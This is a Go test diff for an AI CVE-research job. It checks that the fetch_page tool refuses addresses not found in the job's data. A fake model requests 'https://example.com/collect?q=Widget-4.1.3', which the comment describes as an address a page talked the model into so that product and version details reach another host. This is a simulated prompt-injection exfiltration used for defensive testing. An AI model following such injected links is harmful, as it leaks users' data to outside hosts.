@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"fmt"
 	"net/http"
 	"net/http/httptest"
 	"net/netip"
@@ -355,5 +356,76 @@ func TestDefence_ResearchQuoteCountsOnlyOnThePageItCites(t *testing.T) {
 				t.Fatalf("a quote that is not on the cited page counts as checked: %s, url %q, text %q", ans.QuoteCheck, ans.URL, ans.QuotedText)
 			}
 		})
+	}
+}
+
+// fetch_page opens only an address the job was given (the CVE record's references, an address inside its data) or a link on a page it
+// read from one of those (one hop): an address a page talked the model into (a query string carrying the product and its version to
+// another host) is refused with a plain result and listed in the run's step, and a link on a page reached by a hop is refused too.
+func TestDefence_FetchPageOpensOnlyAddressesFromTheData(t *testing.T) {
+	a := newAPI(t)
+	id := a.addProfile(internalBody("Local"))["id"].(string)
+	a.want("PUT", "/ai/assignments", "admin", `{"internal_only":false,"jobs":{"research-cves":{"primary":"`+id+`","fallback":null}}}`, 200, "")
+	var paths []string
+	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		paths = append(paths, r.URL.String())
+		w.Header().Set("Content-Type", "text/html")
+		switch r.URL.Path {
+		case "/advisory":
+			_, _ = w.Write([]byte(`<html><body><p>CVE-2099-81001: Widget 4.0 to 4.2.0. Notes: <a href="/notes">notes</a></p></body></html>`))
+		case "/notes":
+			_, _ = w.Write([]byte(`<html><body><p>CVE-2099-81001 notes 4.2.1. <a href="https://example.com/deeper">more</a></p></body></html>`))
+		default:
+			_, _ = w.Write([]byte(`<html><body><p>CVE-2099-81001 page 4.2.1</p></body></html>`))
+		}
+	}))
+	t.Cleanup(srv.Close)
+	a.svc.SetPageServer(srv, func(context.Context, string) ([]netip.Addr, error) {
+		return []netip.Addr{netip.MustParseAddr("93.184.216.34")}, nil
+	})
+	exfil := "https://example.com/collect?q=Widget-4.1.3"
+	turns := [][]string{{exfil, "https://example.com/advisory"}, {"https://example.com/notes"}, {"https://example.com/deeper"}}
+	var results [][]provider.ToolResult
+	n := 0
+	a.fake.research = func(_ context.Context, _ ai.Profile, req provider.Request) (provider.Response, error) {
+		if last := req.Messages[len(req.Messages)-1]; last.Role == provider.RoleTool {
+			results = append(results, last.ToolResults)
+		}
+		if n < len(turns) {
+			var calls []provider.ToolCall
+			for i, u := range turns[n] {
+				calls = append(calls, provider.ToolCall{ID: fmt.Sprintf("c%d%d", n, i), Name: "fetch_page", Arguments: json.RawMessage(`{"url":"` + u + `"}`)})
+			}
+			n++
+			return provider.Response{ToolCalls: calls, Usage: provider.Usage{InputTokens: 10, OutputTokens: 5}, Stop: provider.StopToolUse}, nil
+		}
+		return provider.Response{Text: verdict("unsure", "low", ""), Usage: provider.Usage{InputTokens: 10, OutputTokens: 5}, Stop: provider.StopEnd}, nil
+	}
+	req := researchReq
+	req.Digest += "\nReference: https://example.com/advisory [vendor-advisory]"
+	ans, err := a.svc.Research(a.ctx(), "it@acme.example", req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(results) != 3 {
+		t.Fatalf("%d tool turns", len(results))
+	}
+	refused := func(r provider.ToolResult) bool {
+		return r.IsError && strings.Contains(r.Content, "not in the data for this job")
+	}
+	if !refused(results[0][0]) || refused(results[0][1]) || refused(results[1][0]) || !refused(results[2][0]) {
+		t.Fatalf("results %+v", results)
+	}
+	for _, p := range paths {
+		if strings.Contains(p, "collect") || strings.Contains(p, "deeper") {
+			t.Errorf("the box opened %s", p)
+		}
+	}
+	var listed []string
+	for _, s := range ans.Steps {
+		listed = append(listed, s.Refused...)
+	}
+	if !slices.Contains(listed, exfil) || !slices.Contains(listed, "https://example.com/deeper") {
+		t.Fatalf("refused addresses in the steps = %v", listed)
 	}
 }
